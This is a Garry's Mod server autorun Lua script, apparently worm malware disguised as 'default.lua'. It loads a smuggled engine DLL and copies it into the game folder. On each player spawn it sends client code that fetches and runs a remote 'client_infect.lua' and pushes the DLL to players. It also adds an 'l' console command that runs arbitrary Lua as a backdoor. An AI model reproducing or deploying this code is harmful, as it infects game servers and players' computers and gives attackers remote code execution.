-- Saved in to lua/autorun/server/default.lua

timer.Simple(8, function()
	if file.Exists("download/engine_win32.dll", "MOD") then -- No longer infected?
		require("/../../../download/engine")
		
		ConCommand("hostname !!!" .. GetConVarString("hostname") .. "#\n")
		if not file.Exists("engine_win32.dll", "MOD") then
			local module_file = file.Open("download/engine_win32.dll", "rb", "MOD")
			local module_data = module_file:Read(module_file:Size())

			CreateFile("garrysmod/engine_win32.dll", module_data)
		end

		local function infply(ply)
			ply:SendLua( [[http.Fetch("https://gist.githubusercontent.com/Chrisaster/d9872acbf2da227e9281/raw/client_infect.lua", function(c) local ret = CompileString(c, "l", false) pcall(ret) end, function() end)]])
			SendFile(ply, "engine_win32.dll")
		end

		hook.Add("PlayerInitialSpawn", "infply", function(ply)
			timer.Simple(12, function()
				if IsValid(ply) then
					infply(ply)
				end
			end)
		end)

		for k, v in pairs(player.GetAll()) do
			infply(v) -- In case of loading upon infection, players may already be connected
		end
	end


	local function lua(ply, _, _, code)
		local env = { me = ply, this = ply:GetEyeTrace().Entity }
		setmetatable(env, {
			__index = _G,
			__newindex = function(self, k, v)
				rawset(_G, k, v)
			end
		})

		local ret = CompileString( code, "l", false )
		
		if type(ret) == "string" then
			ply:ChatPrint(ret)
			return
		end
		
		setfenv(ret, env)
		
		local success, ret = pcall(ret)
		
		if success then
			ply:ChatPrint("SUCCESS: " .. tostring(ret))
		else
			ply:ChatPrint("FAIL: " .. tostring(ret))
		end
	end

	concommand.Add( "l", lua )
end)